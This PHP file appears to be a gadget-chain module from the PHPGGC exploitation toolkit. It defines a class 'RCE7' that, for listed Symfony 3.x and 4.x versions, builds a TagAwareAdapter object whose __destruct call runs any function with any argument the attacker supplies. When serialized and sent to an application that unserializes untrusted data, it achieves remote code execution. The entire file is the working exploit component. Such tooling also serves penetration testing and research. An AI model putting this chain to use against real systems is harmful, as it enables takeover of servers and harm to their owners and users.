<?php

namespace GadgetChain\Symfony;

class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = 'v3.2.0 <= v3.4.34 v4.0.0 <= v4.2.11 v4.3.0 <= v4.3.7';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Symfony\Component\Cache\Adapter\TagAwareAdapter($function, $parameter); 
    }
}